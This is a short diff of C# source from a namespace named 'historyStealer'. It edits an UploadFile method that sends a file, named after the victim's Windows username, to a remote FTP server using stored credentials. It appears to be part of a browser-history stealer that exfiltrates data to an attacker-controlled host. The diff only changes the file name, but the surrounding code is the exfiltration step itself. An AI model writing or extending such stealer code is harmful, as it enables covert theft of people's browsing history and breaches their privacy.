@@ -56,7 +56,7 @@ namespace historyStealer
         public void UploadFile(string FullPathFilename)
         {
             
-            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_remoteHost + Environment.UserName+".rar");
+            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_remoteHost + Environment.UserName);
             request.Method = WebRequestMethods.Ftp.UploadFile;
             request.Credentials = new NetworkCredential(_remoteUser, _remotePass);
 
